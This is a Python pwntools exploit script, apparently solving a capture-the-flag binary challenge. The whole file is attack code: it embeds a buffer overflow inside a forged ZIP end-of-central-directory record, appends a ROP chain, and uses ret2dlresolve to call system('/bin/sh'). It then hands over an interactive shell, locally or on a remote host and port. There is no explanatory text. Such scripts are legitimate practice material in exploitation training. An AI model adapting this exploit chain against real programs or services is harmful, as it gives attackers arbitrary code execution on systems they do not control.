#!/usr/bin/env python

from pwn import *
elf = context.binary = ELF('./chall')
libc = elf.libc

local = True

if local:
    p = elf.process()
else:
    host = 'test'
    port = 9055
    p = remote(host,port)

if args.GDB:
    gdb.attach(p,gdbscript=f'''
        continue
    ''')

comp1 = p32(100)
comp2 = p32(800)
filerec_offset = p32(80)

rop = ROP([elf])
padding = b'A'*182
bss = elf.bss(0x100)

dl_resolve_payload = Ret2dlresolvePayload(elf, "system", ["/bin/sh"], bss)
rop.read(0,bss,1000)
rop.ret2dlresolve(dl_resolve_payload)

payload  = p8(0)*24 + comp1 + p8(0x0)*18 + filerec_offset
payload += b'PK\x05\x06' + p8(0)*6 + p16(0x01) + p32(100) + p32(0)
payload += p8(0x0)*(102-len(payload)) + comp2 + p16(0x10)*5
payload += padding + rop.chain()

p.sendline(str(len(payload)))
p.sendline(payload)

time.sleep(0.2)
p.sendline(dl_resolve_payload.payload)

p.interactive()
